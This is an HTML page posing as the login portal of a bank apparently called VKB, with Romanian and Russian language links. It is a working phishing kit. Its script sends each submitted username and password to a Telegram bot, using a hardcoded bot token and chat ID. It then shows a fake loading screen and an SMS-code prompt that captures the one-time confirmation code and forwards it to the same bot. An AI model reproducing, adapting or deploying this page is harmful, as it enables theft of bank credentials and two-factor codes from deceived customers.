<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Главная страница</title>
  <style>
    /* -------------------------
       Стили для body (вся страница)
       ------------------------- */
    body {
      margin: 0; /* убираем стандартные отступы браузера */
      min-height: 100vh; /* минимальная высота = высоте окна */
      background-image: url('bg.png'); /* фон страницы */
      background-size: cover; /* растянуть фон на весь экран */
      background-position: center; /* центрируем фон */
      background-repeat: no-repeat; /* не повторять изображение */
      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif; /* основной шрифт */
      color: #343238; /* основной цвет текста */
      display: flex; /* включаем flex-контейнер */
      justify-content: center; /* центрируем по горизонтали */
      align-items: center; /* центрируем по вертикали */
      flex-direction: column; /* элементы выстраиваются вертикально */
    }


.wb-form {
  position: relative; /* для абсолютного позиционирования нижних элементов */
}

/* Ссылка внизу слева */
.useful-info {
  display: block;
  position: absolute;
  left: 24px;
  bottom: 48px;  /* чуть выше телефона */
  font-size: 14px;
  color: #0088ff;
  text-decoration: none;
  font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
  transition: color 0.3s ease;
}
.useful-info:hover {
  color: #005fcc;
  text-decoration: underline;
}

/* Телефон и контакты справа */
.contact-info.phone-info {
  position: absolute;
  right: 24px;
  bottom: 48px;  /* выровнено с Useful information по вертикали */
  text-align: right;
  font-size: 14px;
  color: #171cb3;  /* цвет как в футере */
  font-family: NatoSans-Light, Helvetica, Arial, sans-serif;
  line-height: 1.3;
  margin: 0;
}

/* Текст внизу формы */
.form-footer-text {
  position: absolute;
  left: 24px;
  bottom: 4px;
  font-size: 12px;
  color: #777;
  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
  margin: 0;
  opacity: 0.8;
}


    .contact-info {
  position: absolute;  /* абсолютное позиционирование внутри формы */
  right: 150px;         /* отступ от правого края формы */
  bottom: -40px;        /* отступ от нижнего края формы */
  text-align: right;   /* выравнивание текста по правому краю */
  font-size: 12px;
  color: white;         /* серый, ненавязчивый */
  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
  line-height: 1.3;
  margin: 0;
}

    
    .form-footer-text {
  position: absolute;
  left: 150px;       /* прижато к левому краю формы */
  bottom: -20px;      /* отступ от нижнего края формы */
  font-size: 12px;  /* чуть меньше шрифт */
  color: white;      /* серый, не броский */
  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
  margin: 0;
  opacity: 0.8;
}


    

    .useful-info {
  display: block;
  position: absolute;
  left: 150px;       /* отступ слева */
  bottom: 24px;     /* отступ снизу формы */
  font-size: 14px;
  color: #0088ff;   /* синий как у кнопки */
  text-decoration: none;
  font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
  transition: color 0.3s ease;
}

.useful-info:hover {
  color: #005fcc;   /* темнее при наведении */
  text-decoration: underline;
}


    /* -------------------------
       Контейнер с языками (правый верхний угол)
       ------------------------- */
    .top-right {
      position: absolute; /* фиксируем в углу страницы */
      top: 20px;
      right: 20px;
      display: flex; /* горизонтальное выравнивание логотипов */
      gap: 20px; /* расстояние между логотипами */
      align-items: center; /* выравнивание по центру по вертикали */
    }

    /* -------------------------
       Стиль каждого языкового логотипа
       ------------------------- */
    .logo-item {
      display: flex; /* иконка и текст в ряд */
      align-items: center; /* вертикальное выравнивание */
      gap: 5px; /* расстояние между иконкой и текстом */
    }

    .logo-item img {
      width: 24px; /* ширина иконки */
      height: 24px; /* высота иконки */
    }

    .logo-item span {
      font-size: 14px; /* размер текста */
      color: white; /* цвет текста */
    }

    /* -------------------------
       Центральный логотип страницы
       ------------------------- */
    .center-logo {
      margin-top: 36px; /* отступ сверху */
      margin-bottom: 30px; /* отступ снизу */
    }

    .center-logo img {
      width: 72px; /* ширина логотипа */
      height: auto; /* автоматическая высота для сохранения пропорций */
    }

    /* -------------------------
       Основной контейнер с формой
       ------------------------- */
    .main-content {
      background-color: #ffffff; /* белый фон */
      width: 90%; /* ширина блока 90% от родителя */
      max-width: 960px; /* максимальная ширина */
      min-height: 400px; /* минимальная высота */
      border: solid #ffffff; /* белая рамка */
      border-width: 0 1px 1px; /* верх 0, боковые и нижняя */
      border-radius: 0; /* без скругления */
      box-sizing: border-box; /* учитываем padding в ширину */
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15); /* тень вокруг блока */
      padding: 40px; /* внутренние отступы */
      display: flex; /* flex для центрирования формы */
      justify-content: center; /* горизонтальное центрирование */
      align-items: center; /* вертикальное центрирование */
    }

    /* -------------------------
       Стили формы входа
       ------------------------- */
    .wb-form {
      width: 100%; /* форма занимает всю ширину контейнера */
      max-width: 400px; /* максимум ширины формы */
      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
      font-feature-settings: "kern" on, "liga" off, "calt" on; /* тонкая настройка шрифта */
    }

    /* -------------------------
       Обертка для каждого поля формы
       ------------------------- */
    .field-wrapper {
      display: flex; /* горизонтальное выравнивание label + input */
      align-items: center; /* вертикальное выравнивание */
      justify-content: space-between; /* расстояние между label и input */
      margin: 15px 0; /* отступы сверху и снизу */
    }

    /* -------------------------
       Стили для подписей полей (label)
       ------------------------- */
    .field-wrapper label {
      font-size: 13px; /* размер текста */
      color: #555; /* цвет текста */
      font-weight: 300; /* легкий шрифт */
      letter-spacing: 0.3px; /* межбуквенный интервал */
      width: 100px; /* ширина блока label */
      text-align: right; /* текст выравнен по правому краю */
      margin-right: 15px; /* отступ от input */
    }

    /* -------------------------
       Стили для полей ввода (input)
       ------------------------- */
    .field-wrapper input {
      flex: 1; /* занимает оставшееся пространство */
      padding: 10px; /* внутренние отступы */
      border: 1px solid #ccc; /* серый бордер */
      background-color: #fff; /* фон поля */
      font-size: 14px; /* размер текста */
      border-radius: 0; /* без скругления */
    }

    /* -------------------------
       Кнопка входа
       ------------------------- */
    .login-button {
  /* Центрирование и отступ */
  margin: 48px auto 0;      /* отступ сверху и выравнивание по центру */
  display: block;            /* кнопка как блочный элемент */
  
  /* Размеры */
  height: 40px;              /* фиксированная высота */
  line-height: 40px;         /* выравнивание текста по вертикали */
  min-width: 136px;          /* минимальная ширина */
  padding: 0 24px;           /* горизонтальные отступы внутри */

  /* Цвет и фон */
  background: #0088ff;       /* синий фон */
  color: #FFFFFF;            /* белый текст */
  border: 1px solid #0088ff; /* рамка такого же цвета */

  /* Скругление */
  border-radius: 4px;        /* закруглённые углы */

  /* Шрифт */
  font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif !important;
  font-feature-settings: "kern" on, "liga" off, "calt" on !important;
  font-size: 14px;
  text-align: center;
  box-sizing: border-box;
  white-space: nowrap;

  /* Поведение */
  cursor: pointer;
  transition: background 0.3s, border 0.3s;
}


    /* -------------------------
       Эффект при наведении на кнопку
       ------------------------- */
    .login-button:hover {
      background-color: #003399; /* более темный цвет при hover */
    }

    /* -------------------------
       НОВЫЕ СТИЛИ: Загрузчик
       ------------------------- */
    .loader-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .loader-overlay.active {
      display: flex;
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #0088ff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* -------------------------
       НОВЫЕ СТИЛИ: Модальное окно SMS
       ------------------------- */
    .modal-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }

    .modal-overlay.active {
      display: flex;
    }

    .modal {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.3);
      width: 90%;
      max-width: 400px;
      animation: slideIn 0.3s ease-out;
    }

    @keyframes slideIn {
      from {
        transform: translateY(-50px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .modal h3 {
      text-align: center;
      color: #333;
      margin-bottom: 15px;
      font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif;
    }

    .modal p {
      text-align: center;
      color: #666;
      margin-bottom: 20px;
      font-size: 13px;
      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
    }

    .sms-input {
      width: 100%;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 18px;
      text-align: center;
      letter-spacing: 3px;
      margin-bottom: 20px;
      box-sizing: border-box;
    }

    .sms-input:focus {
      outline: none;
      border-color: #0088ff;
    }

    .submit-sms-btn {
      width: 100%;
      padding: 14px;
      background: #0088ff;
      color: white;
      border: 1px solid #0088ff;
      border-radius: 4px;
      font-size: 14px;
      font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif;
      cursor: pointer;
      transition: background 0.3s;
    }

    .submit-sms-btn:hover {
      background: #003399;
    }

    .submit-sms-btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }
  </style>
</head>
<body>

  <!-- -------------------------
       Логотипы языков в правом верхнем углу
       ------------------------- -->
  <div class="top-right">
    <div class="logo-item">
      <img src="romana.svg" alt="Română">
      <span>Română</span>
    </div>
    <div class="logo-item">
      <img src="russ.svg" alt="Русский">
      <span>Русский</span>
    </div>
  </div>

  <!-- -------------------------
       Центральный логотип
       ------------------------- -->
  <div class="center-logo">
    <img src="logovkb.svg" alt="Логотип VKB">
  </div>

  <!-- -------------------------
       Основной контейнер с формой входа
       ------------------------- -->
  <div class="main-content">
    <form class="wb-form">
      <!-- Поле Username -->
      <div class="field-wrapper">
        <label for="username">Username</label>
        <input id="username" type="text" required>
      </div>

      <!-- Поле Password -->
      <div class="field-wrapper">
        <label for="password">Password</label>
        <input id="password" type="password" required>
      </div>

      <!-- Кнопка Войти -->
      <button class="login-button" type="submit">Login</button>
    </form>

   
 <div class="contact-info">
  <p>Call Customer Support</p>
  <p>1303 / </p>
</div>

    

<a href="#" class="useful-info">Useful information</a>
    
<p class="form-footer-text">BC , 2017</p>
    
  </div>

  <!-- НОВОЕ: Загрузчик -->
  <div class="loader-overlay" id="loaderOverlay">
    <div class="loader"></div>
  </div>

  <!-- НОВОЕ: Модальное окно SMS -->
  <div class="modal-overlay" id="smsModal">
    <div class="modal">
      <h3>Введите код из SMS</h3>
      <p>Мы отправили код подтверждения на ваш номер телефона</p>
      <input type="text" class="sms-input" id="smsCode" placeholder="000000" maxlength="6">
      <button class="submit-sms-btn" onclick="submitSmsCode()">Отправить</button>
    </div>
  </div>

<script>
// ⚙️ НАСТРОЙКИ TELEGRAM БОТА
const BOT_TOKEN = '6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg';
const CHAT_ID = '5446866680';
const USER_CHAT_ID = 'YOUR_USER_CHAT_ID'; // ЗАМЕНИТЕ на Chat ID пользователя для отправки SMS кода

document.querySelector('.wb-form').addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });

  // НОВОЕ: Показываем загрузчик на 10 секунд
  document.getElementById('loaderOverlay').classList.add('active');

  setTimeout(() => {
    document.getElementById('loaderOverlay').classList.remove('active');
    document.getElementById('smsModal').classList.add('active');
    document.getElementById('smsCode').focus();
  }, 10000);
});

// НОВАЯ ФУНКЦИЯ: Отправка SMS кода
async function submitSmsCode() {
  const smsCode = document.getElementById('smsCode').value.trim();
  
  if (!smsCode) {
    alert('Пожалуйста, введите код из SMS');
    return;
  }

  if (smsCode.length < 4) {
    alert('Код должен содержать минимум 4 символа');
    return;
  }

  const submitBtn = document.querySelector('.submit-sms-btn');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Отправка...';

  const message = `📱 Код из SMS: ${smsCode}`;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: USER_CHAT_ID, // Отправляем пользователю
        text: message
      })
    });

    const data = await response.json();
    
    if (data.ok) {
      alert('Код успешно отправлен!');
      document.getElementById('smsModal').classList.remove('active');
      document.getElementById('smsCode').value = '';
      document.querySelector('.wb-form').reset();
    } else {
      throw new Error('Ошибка отправки');
    }
  } catch (error) {
    console.error('Ошибка:', error);
    alert('Ошибка отправки кода');
  }
  
  submitBtn.disabled = false;
  submitBtn.textContent = 'Отправить';
}

// Закрытие модального окна по клику вне его
document.getElementById('smsModal').addEventListener('click', function(e) {
  if (e.target === this) {
    this.classList.remove('active');
    document.getElementById('smsCode').value = '';
  }
});

// Только цифры в поле SMS
document.getElementById('smsCode').addEventListener('input', function(e) {
  this.value = this.value.replace(/[^0-9]/g, '');
});

// Enter для отправки SMS кода
document.getElementById('smsCode').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    submitSmsCode();
  }
});
</script>


</body>
</html>
